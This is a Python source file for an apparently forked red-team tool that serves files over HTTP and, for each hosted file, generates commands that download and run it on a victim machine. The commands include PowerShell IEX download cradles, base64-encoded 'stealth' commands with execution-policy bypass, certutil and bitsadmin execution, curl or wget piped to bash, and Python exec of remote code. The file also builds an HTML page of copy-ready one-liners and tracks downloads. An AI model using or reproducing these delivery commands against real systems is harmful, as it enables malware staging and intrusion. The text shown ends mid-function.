#!/bin/python3
#
# Original Author: Panagiotis Chartas (t3l3machus)
# Red Team Improvements by: Asif Nawaz Minhas
# GitHub: https://github.com/asifnawazminhas
# Thanks to t3l3machus for the original base code!
# https://github.com/t3l3machus

import ssl, os, re, argparse, urllib.parse, subprocess, hashlib, base64, html
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from platform import system as get_system_type
from sys import exit as _exit, argv
from warnings import filterwarnings
import netifaces as ni
from uuid import uuid4
from datetime import datetime

filterwarnings("ignore", category = DeprecationWarning)

def move_on():
    pass

# Enable colors if Windows 
WINDOWS = True if get_system_type() == 'Windows' else False
os.system('') if WINDOWS else move_on()

''' Colors '''
LINK = '\033[1;38;5;37m'
BROKEN = '\033[48;5;234m\033[1;31m'
HIGHLIGHT = '\033[1;38;5;43m'
GREEN = '\033[38;5;47m'
DIR = '\033[1;38;5;12m'
ORANGE = '\033[0;38;5;214m'
MAIN = '\033[38;5;85m'
END = '\033[0m'
BOLD = '\033[1m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
PURPLE = '\033[95m'
WHITE = '\033[97m'

''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
DEBUG = f'{ORANGE}Debug{END}'
PAYLOAD = f'{PURPLE}Payload{END}'

def exit_with_msg(msg):
    print('[' + DEBUG  + '] ' + msg)
    _exit(1)

def print_banner():
    banner = f"""{RED}
██╗    ██╗██╗    ██╗██╗    ██╗████████╗██████╗ ███████╗███████╗
██║    ██║██║    ██║██║    ██║╚══██╔══╝██╔══██╗██╔════╝██╔════╝
██║ █╗ ██║██║ █╗ ██║██║ █╗ ██║   ██║   ██████╔╝█████╗  █████╗
██║███╗██║██║███╗██║██║███╗██║   ██║   ██╔══██╗██╔══╝  ██╔══╝
╚███╔███╔╝╚███╔███╔╝╚███╔███╔╝   ██║   ██║  ██║███████╗███████╗
 ╚══╝╚══╝  ╚══╝╚══╝  ╚══╝╚══╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝

██████╗ ███████╗██████╗ ████████╗███████╗ █████╗ ███╗   ███╗
██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
██████╔╝█████╗  ██║  ██║   ██║   █████╗  ███████║██╔████╔██║
██╔══██╗██╔══╝  ██║  ██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
██║  ██║███████╗██████╔╝   ██║   ███████╗██║  ██║██║ ╚═╝ ██║
╚═╝  ╚═╝╚══════╝╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
{END}
{CYAN}──────────────────────────────────────────────────────────────────────────────{END}
 {WHITE}Payload Hosting{END} {ORANGE}•{END} {WHITE}HTTP/HTTPS{END} {ORANGE}•{END} {WHITE}PowerShell{END} {ORANGE}•{END} {WHITE}CMD{END} {ORANGE}•{END} {WHITE}Bash{END} {ORANGE}•{END} {WHITE}Python{END}
 {WHITE}Download & Execute{END} {ORANGE}•{END} {WHITE}Memory Execute{END} {ORANGE}•{END} {WHITE}Encoded Commands{END} {ORANGE}•{END} {WHITE}HTML Index{END}
{CYAN}──────────────────────────────────────────────────────────────────────────────{END}
 {YELLOW}Version{END}  : {WHITE}v1.0{END}
 {YELLOW}Author{END}   : {WHITE}Asif Nawaz Minhas{END}
 {YELLOW}Original{END} : {WHITE}Panagiotis "t3l3machus" Chartas{END}
{CYAN}──────────────────────────────────────────────────────────────────────────────{END}
"""
    print(banner)

# -------------- Arguments & Usage -------------- #
parser = argparse.ArgumentParser(description='wwwtree - HTTP File Server with Red Team Features')

parser.add_argument("-r", "--root-path", action="store", help = "The root path to host.", required = True)
parser.add_argument("-i", "--interface", action="store", help = "The interface to host.", required = True)
parser.add_argument("-l", "--level", action="store", help = "Descend only level directories deep.", type = int)
parser.add_argument("-p", "--port", action="store", help = "Server port (default: 80)", type = int)
parser.add_argument("-k", "--keywords", action="store", help = "Comma separated keywords to search for in file names.")
parser.add_argument("-A", "--ascii", action="store_true", help = "Use ASCII instead of extended characters.")
parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")

# Red Team Additions
parser.add_argument("--show-commands", action="store_true", help="Show all download commands for EVERY file in the tree")
parser.add_argument("--obfuscate", action="store_true", help="Obfuscate PowerShell commands")
parser.add_argument("--html-index", action="store_true", help="Generate HTML index page with one-liners")
parser.add_argument("--get-ps", action="store", help="Generate PowerShell command for specific file and exit")
parser.add_argument("--get-bash", action="store", help="Generate bash command for specific file and exit")
parser.add_argument("--get-iex", action="store", help="Generate IEX one-liner for specific file and exit ( style)")
parser.add_argument("--list-payloads", action="store_true", help="List all payload files with ready commands (DEPRECATED - now shown by default)")
parser.add_argument("--log-file", action="store", help="Log file for download tracking")
parser.add_argument("--cert", action="store", help="SSL certificate file for HTTPS (PEM format)")
parser.add_argument("--key", action="store", help="SSL key file for HTTPS")

args = parser.parse_args()

# Parse interface
try:
    lhost = ni.ifaddresses(args.interface)[ni.AF_INET][0]['addr']
except:
    exit_with_msg('Error parsing interface.')

# Parse server port
server_port = 80 if not args.port else args.port

# Parse depth level
if isinstance(args.level, int):
    depth_level = args.level if (args.level > 0) else exit_with_msg('Level (-l) must be greater than 0.')
else:
    depth_level = 4096

# Parse keyword(s)
keywords = []
if args.keywords:
    for word in args.keywords.split(","):
        if len(word.strip()) > 0:
            keywords.append(word.strip())
    verify = [k for k in keywords if k.strip() != '']
    if not len(verify):
        exit_with_msg("Illegal keyword(s) value(s).")

ASCII = False
follow_links = True

# File extensions to exclude from the web tree
hide_extensions = ['zip', 'txt', 'rar', 'tar', 'gz', 'html', 'css', 'font', 'doc', 'docx', 'csv', 'xls', \
'xlsx', 'xml', 'pdf', 'pack', 'idx', 'sample', 'gif', 'png', 'jpeg', 'jpg', 'gif', 'md', 'dmp', '7z', 'bz2', \
'xz', 'deb', 'img', 'iso', 'vmdk', 'ovf', 'ova', 'egg', 'log', 'otf', 'mp3', 'mp4', 'conf', 'yml', 'gitignore']

# Directories to exclude from the web tree
hide_dirs = ['.git']

# Download tracking
download_log = []
log_file = None
if args.log_file:
    log_file = open(args.log_file, 'a')

# -------------- Helper Functions for Encoded Commands -------------- #
def generate_encoded_command(url):
    """Generate PowerShell encoded command for IEX"""
    cmd = f"IEX (New-Object Net.WebClient).DownloadString('{url}')"
    bytes_data = cmd.encode('utf-16le')
    encoded = base64.b64encode(bytes_data).decode()
    return f'powershell.exe -ExecutionPolicy Bypass -EncodedCommand {encoded}'

def generate_encoded_download_command(url, output_path):
    """Generate PowerShell encoded command for download only"""
    cmd = f"(New-Object Net.WebClient).DownloadFile('{url}', '{output_path}')"
    bytes_data = cmd.encode('utf-16le')
    encoded = base64.b64encode(bytes_data).decode()
    return f'powershell.exe -ExecutionPolicy Bypass -EncodedCommand {encoded}'

def generate_encoded_download_execute_command(filename, lhost, port):
    """Generate PowerShell encoded command for download and execute"""
    url = f'http://{lhost}:{port}/{filename}'
    output_path = f'C:\\Windows\\Tasks\\{filename}'
    cmd = f"(New-Object Net.WebClient).DownloadFile('{url}', '{output_path}'); Start-Process '{output_path}'"
    bytes_data = cmd.encode('utf-16le')
    encoded = base64.b64encode(bytes_data).decode()
    return f'powershell.exe -ExecutionPolicy Bypass -EncodedCommand {encoded}'

# -------------- Red Team Payload Functions -------------- #

# Windows - Execute Immediately
def generate_ps_iex_execute(filename, lhost, port):
    """Classic IEX one-liner -  style"""
    url = f'http://{lhost}:{port}/{filename}'
    return f'(New-Object Net.WebClient).DownloadString(\'{url}\') | IEX'

def generate_ps_download_execute(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'(New-Object Net.WebClient).DownloadFile(\'{url}\', \'C:\\Windows\\Tasks\\{filename}\'); Start-Process \'C:\\Windows\\Tasks\\{filename}\''

def generate_certutil_execute(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'certutil -urlcache -f {url} C:\\Windows\\Tasks\\{filename} && C:\\Windows\\Tasks\\{filename}'

def generate_bitsadmin_execute(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'bitsadmin /transfer myjob /download /priority high {url} C:\\Windows\\Tasks\\{filename} && C:\\Windows\\Tasks\\{filename}'

# Windows - Download Only (No Execution)
def generate_ps_download_only(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'(New-Object Net.WebClient).DownloadFile(\'{url}\', \'C:\\Windows\\Tasks\\{filename}\')'

def generate_certutil_download_only(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'certutil -urlcache -f {url} C:\\Windows\\Tasks\\{filename}'

def generate_bitsadmin_download_only(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'bitsadmin /transfer myjob /download /priority high {url} C:\\Windows\\Tasks\\{filename}'

def generate_invoke_webrequest_download_only(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'IWR -Uri {url} -OutFile C:\\Windows\\Tasks\\{filename}'

def generate_wget_download_only_windows(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'wget -O C:\\Windows\\Tasks\\{filename} {url}'

def generate_curl_download_only_windows(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'curl -o C:\\Windows\\Tasks\\{filename} {url}'

# Windows - Encoded Commands (Stealth)
def generate_encoded_iex_command(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return generate_encoded_command(url)

def generate_encoded_download_only_command(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return generate_encoded_download_command(url, f'C:\\Windows\\Tasks\\{filename}')

# Linux - Execute Immediately
def generate_wget_execute_linux(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'wget -qO- {url} | bash'

def generate_curl_execute_linux(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'curl -s {url} | bash'

def generate_wget_download_execute_linux(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'wget -O /dev/shm/{filename} {url} && chmod +x /dev/shm/{filename} && /dev/shm/{filename}'

def generate_curl_download_execute_linux(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'curl -o /dev/shm/{filename} {url} && chmod +x /dev/shm/{filename} && /dev/shm/{filename}'

# Linux - Download Only (No Execution)
def generate_wget_download_only_linux(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'wget -O /dev/shm/{filename} {url}'

def generate_curl_download_only_linux(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'curl -o /dev/shm/{filename} {url}'

def generate_wget_download_only_linux_tmp(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'wget -O /tmp/{filename} {url}'

def generate_curl_download_only_linux_tmp(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'curl -o /tmp/{filename} {url}'

# Cross-Platform
def generate_python_execute(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'python3 -c "import urllib.request; exec(urllib.request.urlopen(\'{url}\').read())"'

def generate_python_download_only(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'python3 -c "import urllib.request; urllib.request.urlretrieve(\'{url}\', \'{filename}\')"'

def generate_ps_iex_one_liner(filename, lhost, port):
    url = f'http://{lhost}:{port}/{filename}'
    return f'powershell -exec bypass -c "iex (New-Object Net.WebClient).DownloadString(\'{url}\')"'

def log_download(client_ip, filename, user_agent):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {client_ip} - {filename} - UA: {user_agent}"
    
    if log_file:
        log_file.write(log_entry + "\n")
        log_file.flush()
    
    download_log.append(log_entry)
    print(f'[{PAYLOAD}] {client_ip} downloaded {YELLOW}{filename}{END}')

def escape_html(text):
    """Escape HTML special characters and handle quotes for HTML attributes"""
    return html.escape(text).replace('"', '&quot;')

def generate_iex_command(filename, url):
    """Generate the classic IEX command -  style"""
    return f'(New-Object Net.WebClient).DownloadString(\'{url}\') | IEX'

def generate_html_index():
    """Generate the HTML index page with all payload commands"""
    html_parts = []
    html_parts.append('''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Red Team Payload Server</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', 'Fira Code', monospace;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: #0f0;
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 {
            color: #0f0;
            text-shadow: 0 0 10px #0f0;
            border-bottom: 2px solid #0f0;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .subtitle {
            color: #ff6600;
            margin-bottom: 30px;
            font-size: 0.9em;
        }
        .payload-card {
            background: #0a0a0a;
            border: 1px solid #0f0;
            border-radius: 8px;
            margin-bottom: 20px;
            padding: 15px;
            transition: all 0.3s ease;
        }
        .payload-card:hover {
            border-color: #ff6600;
            box-shadow: 0 0 15px rgba(0,255,0,0.3);
            transform: translateX(5px);
        }
        .filename {
            color: #ff6600;
            font-size: 1.5em;
            font-weight: bold;
            margin-bottom: 15px;
            border-left: 3px solid #0f0;
            padding-left: 10px;
        }
        .command-section {
            margin: 10px 0;
            padding: 10px;
            background: #111;
            border-radius: 5px;
        }
        .command-label {
            color: #0f0;
            font-weight: bold;
            margin-bottom: 5px;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .command-box {
            display: flex;
            gap: 10px;
            align-items: center;
            margin-top: 5px;
        }
        .command-box input {
            flex: 1;
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 8px 12px;
            font-family: monospace;
            font-size: 0.75em;
            border-radius: 4px;
            min-width: 0;
        }
        .command-box button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 8px 15px;
            cursor: pointer;
            font-weight: bold;
            border-radius: 4px;
            transition: all 0.2s;
            white-space: nowrap;
        }
        .command-box button:hover {
            background: #ff6600;
            transform: scale(1.05);
        }
        .stats {
            background: #0a0a0a;
            border: 1px solid #0f0;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
        }
        .stats span {
            color: #ff6600;
            font-size: 1.5em;
            font-weight: bold;
        }
        .footer {
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #333;
            color: #666;
            font-size: 0.8em;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .live {
            animation: blink 1s infinite;
        }
        .iex-highlight {
            background: #1a0a0a;
            border-left: 3px solid #ff0000;
            padding-left: 10px;
        }
        .download-url {
            background: #000;
            border: 1px solid #ff6600;
            border-radius: 4px;
            padding: 10px;
            margin: 10px 0;
            text-align: center;
        }
        .download-url a {
            color: #0f0;
            text-decoration: none;
            font-size: 1.2em;
        }
        .download-url a:hover {
            color: #ff6600;
            text-decoration: underline;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>Red Team Payload Server</h1>
    <div class="subtitle">Ready-to-use one-liners for your engagement | Modified by Asif Nawaz Minhas</div>
''')
    
    # Add direct download links
    html_parts.append(f'''
    <div class="download-url">
        <div style="color: #ff6600; font-weight: bold; margin-bottom: 5px;">Direct Download URLs:</div>
''')
    
    payload_count = 0
    for root, dirs, files in os.walk(args.root_path):
        for file in files:
            # Skip non-payload files
            skip_exts = ['.txt', '.log', '.md', '.yml', '.yaml', '.json', '.xml', '.html', '.css', 
                        '.js', '.jpg', '.png', '.gif', '.bmp', '.ico', '.pdf', '.doc', '.docx', 
                        '.xls', '.xlsx', '.zip', '.tar', '.gz', '.rar', '.7z']
            if any(file.lower().endswith(ext) for ext in skip_exts):
                continue
                
            payload_count += 1
            url = f'http://{lhost}:{server_port}/{file}'
            html_parts.append(f'        <div><a href="{url}" target="_blank">{url}</a></div>\n')
    
    html_parts.append('    </div>\n')
    
    # Reset and show payload cards
    payload_count = 0
    for root, dirs, files in os.walk(args.root_path):
        for file in files:
            # Skip non-payload files
            skip_exts = ['.txt', '.log', '.md', '.yml', '.yaml', '.json', '.xml', '.html', '.css', 
                        '.js', '.jpg', '.png', '.gif', '.bmp', '.ico', '.pdf', '.doc', '.docx', 
                        '.xls', '.xlsx', '.zip', '.tar', '.gz', '.rar', '.7z']
            if any(file.lower().endswith(ext) for ext in skip_exts):
                continue
                
            payload_count += 1
            url = f'http://{lhost}:{server_port}/{file}'
            
            # Generate all command strings
            ps_mem = generate_ps_iex_one_liner(file, lhost, server_port)
            ps_exec = generate_ps_download_execute(file, lhost, server_port)
            ps_down = generate_ps_download_only(file, lhost, server_port)
            ps_iwr = f'powershell -c "iwr -Uri {url} -OutFile C:\\\\Windows\\\\Tasks\\\\{file}; & C:\\\\Windows\\\\Tasks\\\\{file}"'
            cert_exec = generate_certutil_execute(file, lhost, server_port)
            cert_down = generate_certutil_download_only(file, lhost, server_port)
            bits_exec = generate_bitsadmin_execute(file, lhost, server_port)
            wget_exec = generate_wget_download_execute_linux(file, lhost, server_port)
            curl_exec = generate_curl_download_execute_linux(file, lhost, server_port)
            wget_mem = generate_wget_execute_linux(file, lhost, server_port)
            curl_mem = generate_curl_execute_linux(file, lhost, server_port)
            wget_down_shm = generate_wget_download_only_linux(file, lhost, server_port)
            curl_down_shm = generate_curl_download_only_linux(file, lhost, server_port)
            wget_down_tmp = generate_wget_download_only_linux_tmp(file, lhost, server_port)
            curl_down_tmp = generate_curl_download_only_linux_tmp(file, lhost, server_port)
            python_mem = generate_python_execute(file, lhost, server_port)
            python_down = generate_python_download_only(file, lhost, server_port)
            
            # Encoded commands
            encoded_iex = generate_encoded_command(url)
            encoded_download = generate_encoded_download_command(url, f'C:\\Windows\\Tasks\\{file}')
            encoded_execute = generate_encoded_download_execute_command(file, lhost, server_port)
            
            # The classic IEX command ( style)
            iex_classic = generate_iex_command(file, url)
            
            # Escape all commands for HTML
            iex_classic_escaped = escape_html(iex_classic)
            ps_mem_escaped = escape_html(ps_mem)
            ps_exec_escaped = escape_html(ps_exec)
            ps_down_escaped = escape_html(ps_down)
            ps_iwr_escaped = escape_html(ps_iwr)
            cert_exec_escaped = escape_html(cert_exec)
            cert_down_escaped = escape_html(cert_down)
            bits_exec_escaped = escape_html(bits_exec)
            wget_exec_escaped = escape_html(wget_exec)
            curl_exec_escaped = escape_html(curl_exec)
            wget_mem_escaped = escape_html(wget_mem)
            curl_mem_escaped = escape_html(curl_mem)
            wget_down_shm_escaped = escape_html(wget_down_shm)
            curl_down_shm_escaped = escape_html(curl_down_shm)
            wget_down_tmp_escaped = escape_html(wget_down_tmp)
            curl_down_tmp_escaped = escape_html(curl_down_tmp)
            python_mem_escaped = escape_html(python_mem)
            python_down_escaped = escape_html(python_down)
            encoded_iex_escaped = escape_html(encoded_iex)
            encoded_download_escaped = escape_html(encoded_download)
            encoded_execute_escaped = escape_html(encoded_execute)
            
            html_parts.append(f'''
    <div class="payload-card">
        <div class="filename">[ {file} ]</div>
        
        <!-- IEX CLASSIC -  Style -->
        <div class="command-section iex-highlight">
            <div class="command-label" style="color: #ff0000;">CLASSIC IEX ( Style)</div>
            <div class="command-box">
                <input type="text" id="iex_classic_{payload_count}" value="{iex_classic_escaped}" readonly style="border-color: #ff0000; color: #ff0000;">
                <button onclick="copyToClipboard('iex_classic_{payload_count}')" style="background: #ff0000;">Copy</button>
            </div>
        </div>
        
        <!-- WINDOWS - POWERSHELL -->
        <div class="command-section">
            <div class="command-label">WINDOWS - PowerShell</div>
            <div class="command-box">
                <input type="text" id="ps_mem_{payload_count}" value="{ps_mem_escaped}" readonly>
                <button onclick="copyToClipboard('ps_mem_{payload_count}')">Copy</button>
            </div>
            <div class="command-box" style="margin-top:5px">
                <input type="text" id="ps_exec_{payload_count}" value="{ps_exec_escaped}" readonly>
                <button onclick="copyToClipboard('ps_exec_{payload_count}')">Copy</button>
            </div>
            <div class="command-box" style="margin-top:5px">
                <input type="text" id="ps_down_{payload_count}" value="{ps_down_escaped}" readonly>
                <button onclick="copyToClipboard('ps_down_{payload_count}')">Copy</button>
            </div>
            <div class="command-box" style="margin-top:5px">
                <input type="text" id="ps_iwr_{payload_count}" value="{ps_iwr_escaped}" readonly>
                <button onclick="copyToClipboard('ps_iwr_{payload_count}')">Copy</button>
            </div>
        </div>
        
        <!-- WINDOWS - CMD/OTHER -->
        <div class="command-section">
            <div class="command-label">WINDOWS - CMD/Other</div>
            <div class="command-box">
                <input type="text" id="cert_exec_{payload_count}" value="{cert_exec_escaped}" readonly>
                <button onclick="copyToClipboard('cert_exec_{payload_count}')">Copy</button>
            </div>
            <div class="command-box" style="margin-top:5px">
                <input type="text" id="cert_down_{payload_count}" value="{cert_down_escaped}" readonly>
                <button onclick="copyToClipboard('cert_down_{payload_count}')">Copy</button>
            </div>
            <div class="command-box" style="margin-top:5px">
                <input type="text" id="bits_exec_{payload_count}" value="{bits_exec_escaped}" readonly>
                <button onclick="copyToClipboard('bits_exec_{payload_count}')">Copy</button>
            </div>
        </div>
        
        <!-- WINDOWS - ENCODED COMMANDS -->
        <div class="command-section">
            <div class="command-label">WINDOWS - Encoded Commands (Stealth)</div>
            <div class="command-box">
                <input type="text" id="enc_iex_{payload_count}" value="{encoded_iex_escaped}" readonly>
                <button onclick="copyToClipboard('enc_iex_{payload_count}')">Copy</button>
            </div>
            <div class="command-box" style="margin-top:5px">
                <input type="text" id="enc_down_{payload_count}" value="{encoded_download_escaped}" readonly>
                <button onclick="copyToClipboard('enc_down_{payload_count}')">Copy</button>
            </div>
            <div class="command-box" style="margin-top:5px">
                <input type="text" id="enc_exec_{payload_count}" value="{encoded_execute_escaped}" readonly>
                <button onclick="copyToClipboard('enc_exec_{payload_count}')">Copy</button>
            </div>
        </div>
        
        <!-- LINUX - EXECUTE -->
        <div class="command-section">
            <div class="command-label">LINUX - Execute (/dev/shm)</div>
            <div class="command-box">
                <input type="text" id="wget_exec_{payload_count}" value="{wget_exec_escaped}" readonly>
                <button onclick="copyToClipboard('wget_exec_{payload_count}')">Copy</button>
            </div>
            <div class="command-box" style="margin-top:5px">
                <input type="text" id="curl_exec_{payload_count}" value="{curl_exec_escaped}" readonly>
                <button onclick="copyToClipboard('curl_exec_{payload_count}')">Copy</button>
            </div>
            <div class="command-box" style="margin-top:5px">
                <input type="text" id="wget_mem_{payload_count}" value="{wget_mem_escaped}" readonly>
                <button onclick="copyToClipboard('wget_mem_{payload_count}')">Copy</button>
            </div>
            <div class="command-box" style="margin-top:5px">
                <input type="text" id="curl_mem_{payload_count}" value="{curl_mem_escaped}" readonly>
                <button onclick="copyToClipboard('curl_mem_{payload_count}')">Copy</button>
            </div>
        </div>
        
        <!-- LINUX - DOWNLOAD ONLY -->
        <div class="command-section">
            <div class="command-label">LINUX - Download Only</div>
            <div class="command-box">
                <input type="text" id="wget_down_shm_{payload_count}" value="{wget_down_shm_escaped}" readonly>
                <button onclick="copyToClipboard('wget_down_shm_{payload_count}')">Copy</button>
            </div>
            <div class="command-box" style="margin-top:5px">
                <input type="text" id="curl_down_shm_{payload_count}" value="{curl_down_shm_escaped}" readonly>
                <button onclick="copyToClipboard('curl_down_shm_{payload_count}')">Copy</button>
            </div>
            <div class="command-box" style="margin-top:5px">
                <input type="text" id="wget_down_tmp_{payload_count}" value="{wget_down_tmp_escaped}" readonly>
                <button onclick="copyToClipboard('wget_down_tmp_{payload_count}')">Copy</button>
            </div>
            <div class="command-box" style="margin-top:5px">
                <input type="text" id="curl_down_tmp_{payload_count}" value="{curl_down_tmp_escaped}" readonly>
                <button onclick="copyToClipboard('curl_down_tmp_{payload_count}')">Copy</button>
            </div>
        </div>
        
        <!-- CROSS-PLATFORM - PYTHON -->
        <div class="command-section">
            <div class="command-label">Python (Cross-Platform)</div>
            <div class="command-box">
                <input type="text" id="python_mem_{payload_count}" value="{python_mem_escaped}" readonly>
                <button onclick="copyToClipboard('python_mem_{payload_count}')">Copy</button>
            </div>
            <div class="command-box" style="margin-top:5px">
                <input type="text" id="python_down_{payload_count}" value="{python_down_escaped}" readonly>
                <button onclick="copyToClipboard('python_down_{payload_count}')">Copy</button>
            </div>
        </div>
    </div>\n''')
    
    html_parts.append(f'''
    <div class="stats">
        <div>Available Payloads: <span>{payload_count}</span></div>
        <div>Server: <span>{lhost}:{server_port}</span></div>
        <div class="live">Live - Ready to Serve</div>
    </div>
    <div class="footer">
        Original tool by t3l3machus | Red Team Modifications by Asif Nawaz Minhas<br>
        <span style="color:#0f0;">For authorized testing only</span>
    </div>
</div>
<script>
function copyToClipboard(elementId) {{
    var copyText = document.getElementById(elementId);
    copyText.select();
    copyText.setSelectionRange(0, 99999);
    document.execCommand("copy");
    
    var button = copyText.nextElementSibling;
    var originalText = button.innerHTML;
    button.innerHTML = "Copied!";
    setTimeout(function() {{
        button.innerHTML = originalText;
    }}, 2000);
}}
</script>
</body>
</html>''')
    
    return ''.join(html_parts)

def fake2realpath(path, target):
    sep_count = target.count(".." + os.sep)
    regex_chk_1 = "^" + re.escape(".." + os.sep)
    regex1_chk_2 = "^" + re.escape("." + os.sep)
    regex1_chk_3 = "^" + re.escape(os.sep)
    
    if (re.search(regex_chk_1, target)) and (sep_count <= (path.count(os.sep) - 1)):
        dirlist = [d for d in path.split(os.sep) if d.strip()]
        dirlist.insert(0, os.sep)
        try:
            realpath = ''
            for i in range(0, len(dirlist) - sep_count):
                realpath = realpath + (dirlist[i] + os.sep) if dirlist[i] != "/" else dirlist[i]
            realpath += target.split(".." + os.sep)[-1]
            return str(Path(realpath).resolve())
        except:
            return None
    elif re.search(regex1_chk_2, target):
        return str(Path((path + (target.replace("." + os.sep, "")))).resolve())
    elif not re.search(regex1_chk_3, target):
        return str(Path(path + target).resolve())
    else:
        return str(Path(target).resolve())

def adjustUnicodeError():
    exit_with_msg('The system seems to have an uncommon default encoding. Restart wwwtree with options -q and -A to resolve this issue.')

child = (chr(9500) + (chr(9472) * 2) + ' ') if not ASCII else '|-- '
child_last = (chr(9492) + (chr(9472) * 2) + ' ') if not ASCII else '\\-- '
parent = (chr(9474) + '   ') if not ASCII else '|   '

# -------------- Modified wwwtree with ALL Commands for EVERY File -------------- #
def wwwtree(root_dir, intent = 0, depth = '', depth_level = depth_level):
    try:
        global total_dirs_processed, total_files_processed, lhost, server_port
        root_dirs = next(os.walk(root_dir))[1]
        root_files = next(os.walk(root_dir))[2]
        total_dirs = len(root_dirs)
        total_files = len(root_files)
        symlinks = []
        recursive = []
        print('\r' + BOLD + GREEN + root_dir + END + ' (web root)') if not intent else move_on()

        # Handle symlinks
        for d in root_dirs:
            if os.path.islink(root_dir + d):
                symlinks.append(d)
        
        # Process files
        root_files.sort()
        
        for i in range(0, total_files):
            if root_files[i].count('.'):
                ext = root_files[i].rsplit('.', 1)[-1]
                if ext.lower() in hide_extensions:
                    continue
            
            filename_url = (lhost + ':' + str(server_port) + root_dir.replace(args.root_path, '/') + root_files[i])
            filename_url = 'http://' + re.sub('/+', '/', filename_url)
            filename_display = (lhost + ':' + str(server_port) + root_dir.replace(args.root_path, '/') + HIGHLIGHT + root_files[i] + END)
            filename_display = 'http://' + re.sub('/+', '/', filename_display)
            
            # Generate encoded commands for this file
            iex_classic = generate_iex_command(root_files[i], filename_url)
            encoded_iex = generate_encoded_command(filename_url)
            encoded_download = generate_encoded_download_command(filename_url, f'C:\\Windows\\Tasks\\{root_files[i]}')
            encoded_execute = generate_encoded_download_execute_command(root_files[i], lhost, server_port)
            
            # Print file branch with URL
            if not keywords:
                prefix = depth + child if (i < (total_files + total_dirs) - 1) else depth + child_last
                print(prefix + filename_display)
                
                # Show ALL download commands for EVERY file when --show-commands is enabled
                if args.show_commands:
                    indent = depth + '    '
                    print(f'{indent}{RED}├─[CLASSIC IEX]:{END} {iex_classic}')
                    print(f'{indent}{CYAN}├─[Windows C:\\Windows\\Tasks - Execute] PowerShell:{END} (New-Object Net.WebClient).DownloadFile(\'{filename_url}\', \'C:\\\\Windows\\\\Tasks\\\\{root_files[i]}\'); Start-Process \'C:\\\\Windows\\\\Tasks\\\\{root_files[i]}\'')
                    print(f'{indent}{CYAN}├─[Windows C:\\Windows\\Tasks - Execute] certutil:{END} certutil -urlcache -f {filename_url} C:\\Windows\\Tasks\\{root_files[i]} && C:\\Windows\\Tasks\\{root_files[i]}')
                    print(f'{indent}{CYAN}├─[Windows C:\\Windows\\Tasks - Download Only] PowerShell:{END} (New-Object Net.WebClient).DownloadFile(\'{filename_url}\', \'C:\\\\Windows\\\\Tasks\\\\{root_files[i]}\')')
                    print(f'{indent}{CYAN}├─[Windows C:\\Windows\\Tasks - Download Only] certutil:{END} certutil -urlcache -f {filename_url} C:\\Windows\\Tasks\\{root_files[i]}')
                    print(f'{indent}{CYAN}├─[Windows C:\\Windows\\Tasks - Download Only] IWR:{END} IWR -Uri {filename_url} -OutFile C:\\Windows\\Tasks\\{root_files[i]}')
                    print(f'{indent}{CYAN}├─[Windows - EncodedCommand - IEX] (Stealth):{END} {encoded_iex}')
                    print(f'{indent}{CYAN}├─[Windows - EncodedCommand - Download Only] (Stealth):{END} {encoded_download}')
                    print(f'{indent}{CYAN}├─[Windows - EncodedCommand - Download & Execute] (Stealth):{END} {encoded_execute}')
                    print(f'{indent}{CYAN}├─[Linux /dev/shm - Execute] wget:{END} wget -O /dev/shm/{root_files[i]} {filename_url} && chmod +x /dev/shm/{root_files[i]} && /dev/shm/{root_files[i]}')
